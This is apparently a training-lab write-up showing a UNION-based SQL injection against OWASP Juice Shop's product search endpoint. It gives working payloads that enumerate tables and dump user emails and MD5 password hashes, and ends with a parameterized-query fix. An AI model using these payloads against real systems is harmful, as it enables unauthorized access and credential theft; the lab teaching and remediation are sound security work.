# Extracting user login credentials via SQL injection

As part of this project, the vulnerability class CWE-89:SQL Injection (Common Weakness Enumeration) in the OWASP Juice Shop application was investigated. The goal of the challenge was to gain access to 
stored user credentials by exploiting an insecure database query.

To solve this Challenge run `burpsuite` on your Kali VM, its a Tool for intercepting, analyzing, and testing web traffic for security vulnerabilities. It functions as a kind of "man-in-the-middle" proxy between your browser and the website. This allows it to capture, display, and modify all data traffic.

The first step was to find a vulnerable endpoint where SQL could be injected. Any field that retrieves data from the database is a potential candidate. Login forms and search bars are common targets. For this challenge the login endpoint doesnt solved the challenge so it made sense to take advantage of the search bar. Search for a product e.g. "apple" then look into the `burpsuite`
http-history to find the request and send it to the burpsuite repeater.

<img width="1532" height="913" alt="burpsuite" src="https://github.com/user-attachments/assets/dd85098c-6b1c-4128-b0c9-dabd81e50068" />

To retrieve data from multiple tables, SQL provides the UNION operator. Its required because it is the only SQL operator that allows combining results from different tables into a single query response. Without it, the endpoint would only return data from the intended table (e.g., products) and not from other tables such as user data. For a UNION query to work, both SELECT statements must return the same number of columns and compatible data types.
To detect the number of columns, modify the request in the Repeater by adding apple to the q parameter `GET /rest/products/search?q=apple` and send it.

<img width="1332" height="958" alt="burpsuite2" src="https://github.com/user-attachments/assets/586bfa09-fee1-4a63-9a66-53bbb751786d" />

Looking at the response, you can see a JSON array containing several objects, each with 9 fields. This suggests that the underlying SQL query returns 9 columns. With this information, the SQL-Payload
can be prepared. Beforehand, the table and column names for the user credentials need to be identified. One could try guessing `user` or `users` would be logical choices but to be on the safe side, we will query the table names directly from the database metadata. `sqlite_master` is an internal system table in SQLite that stores the complete database structure.

```bash
UNION SELECT name,2,3,4,5,6,7,8,9 FROM sqlite_master WHERE type='table'--  
```

Because spaces and special characters can cause problems depending on the server configuration, Cyberchef comes into play `https://gchq.github.io/CyberChef/`, a tool for manipulating, analyzing, encrypting, or decrypting a wide variety of data formats.

Copy the payload into CyberChef and use the URL Encoding function to make it usable.

<img width="1724" height="742" alt="cyberchef sql" src="https://github.com/user-attachments/assets/51086994-73d8-4900-b040-2ad3047beb8d" />

Copy the output from Cyberchef into the repeater request in burpsuite and send it. The request Should look like this 
```bash
GET /rest/products/search?q=apple'))UNION%20SELECT%20name,2,3,4,5,6,7,8,9%20FROM%20sqlite_master%20WHERE%20type='table'--
```

<img width="1342" height="611" alt="burpsuite3" src="https://github.com/user-attachments/assets/da52dab6-c042-42e6-ab13-16e83f6bf616" />

In the response you can see the JSON array containing all database table names, if you look closely, the table we need is called `Users`.

The Final Payload should now be like this 
```bash 
GET /rest/products/search?q=apple'))UNION SELECT id,email,password,4,5,6,7,8,9 FROM Users--
```
After URL Encode 
```bash 
GET /rest/products/search?q=apple'))UNION%20SELECT%20id,email,password,4,5,6,7,8,9%20FROM%20Users--
```

<img width="1716" height="1074" alt="credentials" src="https://github.com/user-attachments/assets/6d6a3c64-d7db-4eee-a913-2bff41c88ac4" />

Voilà, we obtained the user credentials and solved the challenge. Using Hashcat, we could attempt to crack the password hashes. They appear to be MD5 (32 hexadecimal characters), an old hashing algorithm that is now considered cryptographically broken. 
The real vulnerability is that user input is interpreted directly as part of the SQL command instead of being treated strictly as data. The only complete solution is the consistent separation of code and data through parameterized queries (prepared statements) or correctly used ORM layers. Other measures like a Web Application Firewall (WAF) additionally reduce the risk, but do not replace the basic solution.

Edit the `search.ts` in `/juice-shop/routes` to close this vulnerbility

```bash
## comment out the insecure line ##
// models.sequelize.query(`SELECT * FROM Products WHERE ((name LIKE '%${criteria}%' OR description LIKE '%${criteria}%') AND deletedAt IS NULL) ORDER BY name`)

## new more save line ##
models.sequelize.query(
  `SELECT * FROM Products WHERE ((name LIKE :criteria OR description LIKE :criteria) AND deletedAt IS NULL) ORDER BY name`,
  { replacements: { criteria: `%${criteria}%` } }
).then(([products]: any) => {
```